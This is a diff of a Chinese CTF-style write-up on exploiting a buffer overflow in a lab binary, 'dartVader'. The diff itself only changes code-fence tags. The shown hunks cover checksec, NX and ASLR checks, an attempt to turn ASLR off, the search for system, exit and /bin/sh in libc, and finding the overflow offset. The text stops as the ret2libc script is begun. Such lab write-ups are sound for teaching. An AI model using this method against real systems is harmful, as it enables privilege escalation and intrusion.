@@ -14,7 +14,7 @@ peda 是 Python Exploit Development Assistance 的缩写，这个工具是建立
 
 ### gdb-peda 下载
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo apt install gdb-peda
 gdb-peda is already the newest version (1.2-0kali2).
@@ -33,7 +33,7 @@ Summary:
 
 寻找 peda 存放位置
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ locate gdb-peda
 /usr/share/gdb-peda
@@ -60,7 +60,7 @@ lib  peda.py
 
 启动 peda
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ gdb dartVader                                                   
 GNU gdb (Debian 16.3-1) 16.3
@@ -90,7 +90,7 @@ gdb-peda$
 
 #### checksec
 
-```
+```bash
 gdb-peda$ checksec
 CANARY    : disabled
 FORTIFY   : disabled
@@ -127,7 +127,7 @@ RELRO 保护 GOT（全局偏移表）不被改写，有两种模式：
 
 主函数反汇编分析：
 
-```
+```bash
 gdb-peda$ disassemble main
 Dump of assembler code for function main:
    0x0804844d <+0>:     push   ebp
@@ -194,7 +194,7 @@ End of assembler dump.
 
 ## 手工测试缓冲区溢出漏洞
 
-```
+```bash
 erso@deathStar1:~$ /bin/dartVader
 dartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...
 
@@ -209,7 +209,7 @@ Segmentation fault (core dumped)
 
 /bin/dartVader 在处理 100 个 A 输入时访问了非法内存，很可能是由于缓冲区溢出或未正确处理长输入导致的。
 
-```
+```bash
 erso@deathStar1:~$ dmesg |tail
 [   10.915276] audit: type=1400 audit(1767178920.659:12): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=949 comm="apparmor_parser"
 [   10.915355] audit: type=1400 audit(1767178920.659:13): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=949 comm="apparmor_parser"
@@ -229,7 +229,7 @@ erso@deathStar1:~$ dmesg |tail
 
 可以确认有缓冲区溢出漏洞。一般来说缓冲区溢出漏洞，要写入 shellcode，这样看安全机制是否允许写入。所以利用还要看有什么安全机制，者关乎我们的利用方式和利用是否能成功。
 
-```
+```bash
 erso@deathStar1:~$ readelf -W -l /bin/dartVader | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
 ```
@@ -238,7 +238,7 @@ readelf 是用于查看 ELF（Executable and Linkable Format）格式文件信�
 
 GNU_STACK 的权限是 RW（可读可写），没可以 X（可执行）。这意味着该程序的堆栈被标记为不可执行。这是现代操作系统中常见的安全特性（称为 NX 或 DEP，Data Execution Pervention），用于防止缓冲区溢出攻击中将恶意代码注入堆栈并执行。也可以在 Kali 中使用 scanelf 检查相关属性。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ scanelf -e dartVader 
  TYPE   STK/REL/PTL FILE 
@@ -249,7 +249,7 @@ ET_EXEC RW- R-- RW- dartVader
 
 查看程序的动态链接库：
 
-```
+```bash
 erso@deathStar1:~$ ldd /bin/dartVader 
         linux-gate.so.1 =>  (0xb76e6000)
         libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb752a000)
@@ -280,7 +280,7 @@ NX/DEP 全称为 No eXecute/ Data Execution Prevention（不可执行内存/数�
 
 每次执行 ldd 查看动态链接库时都能看到内存中加载的地址不同。
 
-```
+```bash
 erso@deathStar1:~$ ldd /bin/dartVader 
         linux-gate.so.1 =>  (0xb77d1000)
         libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7615000)
@@ -293,7 +293,7 @@ erso@deathStar1:~$ ldd /bin/dartVader
 
 这是系统启用了 ASLR 的典型特征，具体验证一下。
 
-```
+```bash
 erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space 
 2
 ```
@@ -307,12 +307,12 @@ erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space
 
 可以尝试将其修改为 0，但是权限往往不允许。
 
-```
+```bash
 erso@deathStar1:~$ echo 0 > /proc/sys/kernel/randomize_va_space
 -bash: /proc/sys/kernel/randomize_va_space: Permission denied
 ```
 
-```
+```bash
 erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)"
    111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
    139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
@@ -338,13 +338,13 @@ erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|e
 
 ### 确定缓冲区大小
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ msf-pattern_create -l 100
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ ./dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 zsh: segmentation fault  ./dartVader 
@@ -363,7 +363,7 @@ zsh: segmentation fault  ./dartVader
 [12358.851987] Code: Unable to access opcode bytes at 0x63413539.
 ```
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ msf-pattern_offset -l 100 -q 0x63413563        
 [*] Exact match at offset 76
@@ -373,7 +373,7 @@ zsh: segmentation fault  ./dartVader
 
 确定需要用到的函数地址。
 
-```
+```bash
 erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|exit)"
    111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
    139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
@@ -393,7 +393,7 @@ erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E "(system|e
   2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
 ```
 
-```
+```bash
 erso@deathStar1:~$ ldd /bin/dartVader 
         linux-gate.so.1 =>  (0xb76e1000)
         libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7525000)
@@ -410,7 +410,7 @@ erso@deathStar1:~$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -E /bin/sh
 
 攥写利用脚本：
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ vim ret2libc.py
                                                                                                                               
